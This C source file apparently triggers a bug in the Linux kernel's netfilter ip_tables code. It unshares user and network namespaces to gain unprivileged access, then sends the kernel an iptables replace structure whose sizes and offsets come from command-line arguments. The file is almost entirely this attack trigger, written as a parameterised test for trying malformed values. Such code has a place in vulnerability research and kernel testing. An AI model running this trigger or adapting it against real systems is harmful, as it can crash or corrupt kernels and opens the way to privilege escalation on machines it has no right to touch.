/*
 * providing different user input
 * make replace_size=176 num_entries=1 num_counters=1 n_offset=176 t_offset=144 m_size=32 m_revision=0 t_size=32 t_revision=1 test1
 * Or
 * make test1
 */
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <linux/netfilter_ipv4/ip_tables.h>

int main(int argc, char *argv[]) {

////////////// ARGS FROM MAKEFILE //////////
  if(argc < 10){
    printf("No argument passed through command line: %d\n",argc);
    return -1;
  }

  int replace_size = atoi(argv[1]);
  int num_entries = atoi(argv[2]);
  int num_counters = atoi(argv[3]);
  int next_offset = atoi(argv[4]);
  int target_offset = atoi(argv[5]);
  int match_size = atoi(argv[6]);
  int match_revision = atoi(argv[7]);
  int target_size = atoi(argv[8]);
  int target_revision = atoi(argv[9]);
  /////////////////////////////////////////////

  int s;

  if (unshare(CLONE_NEWUSER) != 0) err(1, "unshare(CLONE_NEWUSER)");
  if (unshare(CLONE_NEWNET) != 0) err(1, "unshare(CLONE_NEWNET)");

  if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) err(1, "socket");

  struct {
    struct ipt_replace replace;
    struct ipt_entry entry;
    struct xt_entry_match match;
    //char pad[0xD0];
    struct xt_entry_target target;
  } data = {0};

  data.replace.num_counters = num_counters;
  data.replace.num_entries = num_entries;
  data.replace.size = replace_size; //(sizeof(data.entry) + sizeof(data.match) +
                      /* sizeof(data.pad) + */ //sizeof(data.target));

  data.entry.next_offset = next_offset; //(sizeof(data.entry) + sizeof(data.match) +
                           /* sizeof(data.pad) + */ //sizeof(data.target));
  data.entry.target_offset = target_offset; //(sizeof(data.entry) + sizeof(data.match) /* +  sizeof(data.pad)*/);

  data.match.u.user.match_size = match_size; //(sizeof(data.match) /*+ sizeof(data.pad) */);
  strcpy(data.match.u.user.name, "icmp");
  data.match.u.user.revision = match_revision; //0;

  data.target.u.user.target_size = target_size; //sizeof(data.target);
  strcpy(data.target.u.user.name, "NFQUEUE");
  data.target.u.user.revision = target_revision; //1;
 
 ////////////////////
  printf("data.replace.size: %u\n", data.replace.size);
  printf("data.match.u.user.match_size: %u\n", data.match.u.user.match_size);
 /////////////////

  //make socket call
  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
    if (errno == ENOPROTOOPT)
      err(1, "Error: ip_tables module is not loaded");
  }

  close(s);

  return 0;
}